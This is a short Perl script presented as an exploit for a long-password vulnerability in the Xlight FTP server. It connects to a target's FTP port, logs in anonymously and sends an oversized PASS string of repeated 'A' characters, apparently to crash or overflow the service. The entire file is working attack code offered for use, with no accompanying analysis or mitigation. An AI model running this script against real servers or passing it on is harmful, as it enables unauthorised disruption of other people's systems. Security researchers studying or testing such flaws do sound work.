#!/usr/bin/perl
 
# Exploit for Xlight FTP server long PASS vulnerability
 
use IO::Socket;
unless (@ARGV == 1) { die "usage: $0 host ..." }
$host = shift(@ARGV);
$remote = IO::Socket::INET->new( Proto => "tcp",
                                 PeerAddr => $host,
                                 PeerPort => "ftp(21)",
                                 );
unless ($remote) { die "cannot connect to ftp daemon on $host" }

$remote->autoflush(1);

print $remote "USER anonymous\r\n";
sleep(1);

$buf = "A"x54; # Min 54, Max 523
print $remote "PASS ".$buf."\r\n";
sleep(1);

close $remote;
